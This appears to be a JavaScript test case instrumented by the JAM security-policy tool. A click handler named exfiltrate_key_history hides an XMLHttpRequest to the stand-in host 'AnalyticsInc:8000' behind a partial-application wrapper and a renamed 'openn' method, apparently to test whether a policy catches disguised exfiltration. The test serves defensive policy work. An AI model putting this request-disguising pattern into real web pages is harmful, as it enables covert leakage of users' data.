function exfiltrate_key_history() {
  function partial(func$$3) {
    function v0() {
      var v8 = Array.prototype;
      var v5 = v8.slice;
      var v1 = JAM.call(v5.call, v5, [arguments], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
      var allArguments = JAM.call(args.concat, args, [v1], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
      return JAM.call(func$$3.apply, func$$3, [this, allArguments], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1)
    }
    var v6 = Array.prototype;
    var v2 = v6.slice;
    var args = JAM.call(v2.call, v2, [arguments, 1], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
    return v0
  }
  xmlhttp = new XMLHttpRequest;
  var v3 = xmlhttp;
  var v7 = xmlhttp.open;
  var v9 = partial(v7, "GET", "http://AnalyticsInc:8000/submission.html?test=partial", true);
  v3.openn = v9;
  JAM.call(xmlhttp.openn, xmlhttp, [], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.pC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);
  return
}
var v4 = document.getElementById("test");
JAM.set(v4, "onclick", exfiltrate_key_history);
